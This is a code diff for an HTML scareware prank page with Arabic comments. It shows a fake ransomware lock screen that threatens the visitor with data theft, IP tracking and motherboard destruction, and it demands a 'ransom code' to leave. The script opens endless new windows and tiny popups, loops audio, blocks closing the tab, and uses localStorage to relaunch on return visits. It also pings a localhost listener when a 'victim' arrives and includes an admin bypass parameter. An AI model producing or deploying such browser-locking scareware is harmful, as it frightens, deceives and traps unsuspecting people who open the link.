@@ -1,43 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL ⚠️</title>
+    <title>☠️ 505 SYSTEM_DESTROYED ☠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        /* واجهة الديب ويب: سواد مطلق وسيطرة كاملة */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: none; }
         
-        /* تعديل الصورة باش تخرج Force Full Screen سواسوة */
         #horrorImg { 
             position: fixed; top: 0; left: 0; 
             width: 100vw; height: 100vh; 
-            object-fit: cover; /* تعمر الشاشة بلا ما تدييفورما سواسوة */
+            object-fit: cover; 
             z-index: 9999; display: none; 
+            filter: contrast(150%) brightness(80%);
         }
 
-        #timerBox { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
-        #count { font-size: 150px; font-weight: bold; text-shadow: 0 0 30px #f00; }
-        
-        #textOverlay { 
+        #deepWebOverlay { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #f00; display: none; width: 85%; 
+            background: rgba(0,0,0,0.95); padding: 40px; border: 1px solid #300; display: none; width: 95%; 
+            box-shadow: 0 0 50px #f00;
         }
-        .blink { animation: blinker 0.1s linear infinite; }
+
+        .matrix-text { color: #f00; font-size: 10px; position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; z-index: 1; pointer-events: none; }
+        .blink { animation: blinker 0.05s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
+        
+        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 10px; width: 70%; text-align: center; }
     </style>
 </head>
-<body onclick="initiateSequence()">
+<body onclick="launchNightmare()">
 
-    <div id="timerBox">
-        <div id="count">3</div>
-        <p class="blink">LOADING_MALWARE...</p>
+    <div id="clickAnywhere" style="color: #300; font-family: monospace; z-index: 10001; font-size: 12px;">
+        [ FATAL_ERROR: CLICK_TO_RESTORE_SYSTEM ]
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    <div id="textOverlay" class="blink">
-        <h1>SYSTEM TERMINATED</h1>
-        <p>Your files are encrypted. Attempting to close will delete all data.</p>
+    
+    <div id="deepWebOverlay">
+        <h1 class="blink" style="font-size: 24px; letter-spacing: 5px;">WE ARE WATCHING YOU</h1>
+        <p style="font-size: 14px; color: #fff; border-bottom: 1px solid #f00; padding-bottom: 10px;">
+            لقد وقعت في فخ النظام المظلم. جميع بياناتك تم سحبها وتشفيرها في خوادم الديب ويب.
+        </p>
+        <p style="font-size: 12px; color: #888;">IP_LOGGED: <span id="ip_display">192.168.1.1</span> | LOCATION: <span style="color:#f00;">TRACKED</span></p>
+        <p style="font-size: 11px;">محاولة الخروج تعني تدمير اللوحة الأم (Motherboard) فوراً.</p>
+        
+        <input type="text" id="unlockBox" placeholder="أدخل رمز الفدية للمغادرة" oninput="verifyAdmin()">
+        <div id="status" style="font-size: 10px; margin-top: 10px;">STATUS: <span class="blink">LOCKED</span></div>
     </div>
 
     <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
@@ -45,53 +55,48 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const isAdmin = urlParams.get('user') === 'admin_dz'; 
-        const audio = document.getElementById('sfx');
         const MY_LINK = window.location.href;
-        
-        let running = false;
-        let timeLeft = 3;
+        const audio = document.getElementById('sfx');
 
-        // ميزة الذاكرة: نتحققو إذا الضحية فات عليه العد التنازلي سواسوة
-        if (localStorage.getItem('hacked') === 'true' && !isAdmin) {
-            setTimeout(() => triggerHorror(), 500); // تخرج الصورة ديركت بلا عد سواسوة
+        // ميزة الدخول الفوري سواسوة
+        if (localStorage.getItem('terminal_breach') === 'true' && !isAdmin) {
+            setTimeout(() => launchNightmare(), 100);
         }
 
-        function initiateSequence() {
-            if (isAdmin) return alert("Welcome Admin!");
-            if (running || localStorage.getItem('hacked') === 'true') return;
+        function launchNightmare() {
+            if (isAdmin) return alert("System Bypass: Active. Welcome Admin.");
             
-            running = true;
+            // إرسال تنبيه لـ Termux سواسوة
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
+            localStorage.setItem('terminal_breach', 'true');
 
-            let countdown = setInterval(() => {
-                timeLeft--;
-                document.getElementById('count').innerText = timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(countdown);
-                    localStorage.setItem('hacked', 'true'); // نسجلو بلي الضحية حصل سواسوة
-                    triggerHorror();
-                }
-            }, 1000);
-        }
-
-        function triggerHorror() {
-            document.getElementById('timerBox').style.display = 'none';
+            document.getElementById('clickAnywhere').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
-            document.getElementById('textOverlay').style.display = 'block';
+            document.getElementById('deepWebOverlay').style.display = 'block';
             
-            audio.play().catch(() => {});
+            audio.play();
+            audio.onended = () => { if(!isAdmin) audio.play(); };
 
-            // ميزة الحبس: فتح تبويبات جديدة سواسوة
+            // ميزة "الحبس المحطم" سواسوة
             setInterval(() => {
-                if (!isAdmin) window.open(MY_LINK, '_blank');
-            }, 1500);
+                if (!isAdmin) {
+                    window.open(MY_LINK, '_blank', 'width=10,height=10');
+                    window.open(MY_LINK, '_blank');
+                }
+            }, 800);
         }
 
-        // منع الخروج سواسوة
-        document.addEventListener("visibilitychange", () => {
-            if (!isAdmin && document.visibilityState === 'hidden') {
-                window.open(MY_LINK, '_blank');
+        function verifyAdmin() {
+            if (document.getElementById('unlockBox').value === "free palastine") {
+                localStorage.removeItem('terminal_breach');
+                location.href = "https://www.google.com";
             }
+        }
+
+        // إجبارية البقاء سواسوة
+        window.onbeforeunload = () => "تحذير: سيتم مسح بياناتك!";
+        document.addEventListener("visibilitychange", () => {
+            if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
         });
     </script>
 </body>
